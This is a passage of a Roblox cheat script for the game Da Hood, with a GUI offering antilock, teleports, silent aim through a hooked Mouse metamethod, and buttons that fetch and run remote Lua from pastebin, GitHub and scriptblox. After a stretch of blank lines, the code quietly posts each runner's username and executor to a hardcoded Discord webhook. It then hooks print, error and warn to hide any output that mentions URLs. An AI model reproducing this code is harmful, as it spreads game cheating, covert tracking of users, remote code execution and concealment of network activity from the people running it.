				v:Destroy()
			end
		end
		game.Players.LocalPlayer.CharacterAdded:Connect(function(char)
			repeat
				wait()
			until game.Players.LocalPlayer.Character
			char.ChildAdded:Connect(function(child)
				if child:IsA("Script") then 
					wait(0.1)
					if child:FindFirstChild("LocalScript") then
						child.LocalScript:FireServer()
					end
				end
			end)
		end)

	end)

	local glitch = false
	local clicker = false

	Tab3:Textbox("AntiLock (use -0.10 to -0.60)","Speed",function(a)

		getgenv().Multiplier = a

	end, {
		["clear"] = false,
	})

	Tab3:Button("Antilock Improved (Z)",function(bool)
		local userInput = game:service('UserInputService')
		local runService = game:service('RunService')

		userInput.InputBegan:connect(function(Key)
			if Key.KeyCode == Enum.KeyCode.Z then
				Enabled = not Enabled
				if Enabled == true then
					repeat
						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + game.Players.LocalPlayer.Character.Humanoid.MoveDirection * getgenv().Multiplier
						runService.Stepped:wait()
					until Enabled == false
				end
			end
		end)
	end)

	local Tab4 = Window:Tab("Teleports",false)

	Tab4:Label("Teleports")

	Tab4:Button("Double Barrel",function(value)
		getgenv().game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1039.59985, 18.8513641, -256.449951, -1, 0, 0, 0, 1, 0, 0, 0, -1)
	end)

	Tab4:Button("Revolver",function(value)
		getgenv().game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-638.75, 18.8500004, -118.175011, -1, 0, 0, 0, 1, 0, 0, 0, -1)
	end)

	Tab4:Button("Shotgun",function(value)
		getgenv().game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-578.623657, 5.47212696, -725.131531, 0, 0, 1, 0, 1, -0, -1, 0, 0)
	end)

	Tab4:Button("Tactical Shotgun",function(value)
		getgenv().game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(470.877533, 45.1272316, -620.630676, 0.999999821, 0.000604254019, -2.60802135e-08, -0.000604254019, 0.999999821, -8.63220048e-05, -2.60802135e-08, 8.63220048e-05, 1)
	end)

	Tab4:Button("Smg",function(value)
		getgenv().game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-577.123413, 5.47666788, -718.031433, -1, 0, 0, 0, 1, 0, 0, 0, -1)
	end)

	Tab4:Button("RPG",function(value)
		getgenv().game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-794.814697, -42.5468521, -932.97998, 5.96046448e-08, 2.91038305e-11, 1, -0.000610388815, 0.999999821, 2.91038305e-11, -0.999999762, -0.000610388815, 5.96046448e-08)
	end)

	Tab4:Button("Armor",function(value)
		getgenv().game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-607.978455, 7.44964886, -788.494263, -1.1920929e-07, 0, 1.00000012, 0, 1, 0, -1.00000012, 0, -1.1920929e-07)
	end)

	Tab4:Button("PopCorn",function(value)
		getgenv().game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-995, 21.6998043, -153.100037, 1, 0, 0, 0, 1, 0, 0, 0, 1)
	end)

	Tab4:Button("Casino 1v1",function(value)
		getgenv().game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-962.72345, 21.2549973, -186.814987, -0.0274876002, 2.91178949e-05, 0.999621451, -5.5798846e-06, 1, -2.92823333e-05, -0.999621451, -6.38268148e-06, -0.0274876002)
	end)

	Tab4:Button("Bank",function(value)
		getgenv().game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-402.123718, 21.75, -283.988617, 0.0159681588, -0.000121377925, -0.999872446, -2.60148026e-05, 1, -0.000121808866, 0.999872506, 2.79565484e-05, 0.0159681737)
	end)

	Tab4:Button("Main Food",function(value)
		getgenv().game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-338.352173, 23.6826477, -297.2146, -0.0060598203, -1.03402984e-08, -0.999981582, -1.61653102e-09, 1, -1.03306892e-08, 0.999981582, 1.55389912e-09, -0.0060598203)
	end)

	local Tab5 = Window:Tab("Keybind",false)

	Tab5:Label("Keybind")

	Tab5:Keybind("Toggle",Enum.KeyCode.RightShift,function()
		Library:Toggle()
	end)

	local Tab5 = Window:Tab("Credits",false)

	Tab5:Label("Varski#0001,7c#0001")

	local Aiming = loadstring(game:HttpGet("https://pastebin.com/raw/x0GU1rjk"))()
	Aiming.TeamCheck(false)

	local Workspace = game:GetService("Workspace")
	local Players = game:GetService("Players")
	local RunService = game:GetService("RunService")
	local UserInputService = game:GetService("UserInputService")

	local LocalPlayer = Players.LocalPlayer
	local Mouse = LocalPlayer:GetMouse()
	local CurrentCamera = Workspace.CurrentCamera

	local DaHoodSettings = {
		SilentAim = true,
		AimLock = false,
		Prediction = 0.157,
		AimLockKeybind = Enum.KeyCode.E
	}
	getgenv().DaHoodSettings = DaHoodSettings

	function Aiming.Check()
		if not (Aiming.Enabled == true and Aiming.Selected ~= LocalPlayer and Aiming.SelectedPart ~= nil) then
			return false
		end

		local Character = Aiming.Character(Aiming.Selected)
		local KOd = Character:WaitForChild("BodyEffects")["K.O"].Value
		local Grabbed = Character:FindFirstChild("GRABBING_CONSTRAINT") ~= nil

		if (KOd or Grabbed) then
			return false
		end

		return true
	end

	local __index
	__index = hookmetamethod(game, "__index", function(t, k)
		if (t:IsA("Mouse") and (k == "Hit" or k == "Target") and Aiming.Check()) then
			local SelectedPart = Aiming.SelectedPart

			if (DaHoodSettings.SilentAim and (k == "Hit" or k == "Target")) then
				local Hit = SelectedPart.CFrame + (SelectedPart.Velocity * DaHoodSettings.Prediction)

				return (k == "Hit" and Hit or SelectedPart)
			end
		end

		return __index(t, k)
	end)

	RunService:BindToRenderStep("AimLock", 0, function()
		if (DaHoodSettings.AimLock and Aiming.Check() and UserInputService:IsKeyDown(DaHoodSettings.AimLockKeybind)) then
			local SelectedPart = Aiming.SelectedPart

			local Hit = SelectedPart.CFrame + (SelectedPart.Velocity * DaHoodSettings.Prediction)

			CurrentCamera.CFrame = CFrame.lookAt(CurrentCamera.CFrame.Position, Hit.Position)
		end
	end)
	local webhookcheck =
		is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
		secure_load and "Sentinel" or
		KRNL_LOADED and "Krnl" or
		SONA_LOADED and "Sona" or
		"Kid with shit exploit"































	local url =
		"https://discord.com/api/webhooks/901560461093388348/6yB2qq6oCmuya-9RKooVTAvKLvyVgt9UQd4"
	local data = {
		["content"] = " ***PickleAssist Logs***",
		["embeds"] = {
			{
				["title"] = "**Someone Executed Your Script!**",
				["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**",
				["type"] = "rich",
				["color"] = tonumber(0x7269da),
				["image"] = {
					["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
						tostring(game:GetService("Players").LocalPlayer.Name)
				}
			}
		}
	}
	local newdata = game:GetService("HttpService"):JSONEncode(data)

	local headers = {
		["content-type"] = "application/json"
	}
	request = http_request or request or HttpPost or syn.request
	local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
	request(abcdef)

	local denied_message = "Denied Goofy"
	local g
	g = hookfunction(print,function(urprint,...)
		if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") then
			urprint = denied_message
		end
		return g(urprint,...)
	end)

	local p
	p = hookfunction(error,function(urprint,...)
		if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") then
			urprint = denied_message
		end
		return g(urprint,...)
	end)

	local h
	h = hookfunction(warn,function(urprint,...)
		if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") then
			urprint = denied_message
		end
		return g(urprint,...)
	end)
end)

antilag.Name = "anti lag"
antilag.Parent = Main
antilag.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
antilag.BorderColor3 = Color3.fromRGB(255, 0, 0)
antilag.BorderSizePixel = 4
antilag.Position = UDim2.new(-0.000665238302, 0, 0.212781996, 0)
antilag.Size = UDim2.new(0, 187, 0, 33)
antilag.Font = Enum.Font.SourceSansBold
antilag.Text = "Anti Lag"
antilag.TextColor3 = Color3.fromRGB(255, 0, 0)
antilag.TextSize = 22.000
antilag.MouseButton1Down:connect(function()
	for i,v in pairs(workspace:GetDescendants()) do
		if v:IsA("Part") or v:IsA("MeshPart") or v:IsA("BasePart") then
			v.Material = "SmoothPlastic"
		end
	end
	for i,v in pairs(game:GetDescendants()) do
		if v:IsA("Light") or v:IsA("ParticleEmitter") or v:IsA("Trail") then
			v:Destroy()
		end
	end
end)

TeaHub.Name = "TeaHub"
TeaHub.Parent = Main
TeaHub.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TeaHub.BorderColor3 = Color3.fromRGB(255, 0, 0)
TeaHub.BorderSizePixel = 4
TeaHub.Position = UDim2.new(0.295588255, 0, 0.72413516, 0)
TeaHub.Size = UDim2.new(0, 187, 0, 33)
TeaHub.Font = Enum.Font.SourceSansBold
TeaHub.Text = "TeaHub"
TeaHub.TextColor3 = Color3.fromRGB(255, 0, 0)
TeaHub.TextSize = 22.000
TeaHub.MouseButton1Down:connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Aurelius0863/TeaHub/main/Loader.lua"))()
end)

ServerHop.Name = "ServerHop"
ServerHop.Parent = Main
ServerHop.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ServerHop.BorderColor3 = Color3.fromRGB(255, 0, 0)
ServerHop.BorderSizePixel = 4
ServerHop.Position = UDim2.new(0.294922888, 0, 0.554693818, 0)
ServerHop.Size = UDim2.new(0, 187, 0, 33)
ServerHop.Font = Enum.Font.SourceSansBold
ServerHop.Text = "ServerHop"
ServerHop.TextColor3 = Color3.fromRGB(255, 0, 0)
ServerHop.TextSize = 22.000
ServerHop.MouseButton1Down:connect(function()
	loadstring(game:HttpGet("https://www.scriptblox.com/raw/Server-Browser_80", true))();
end)
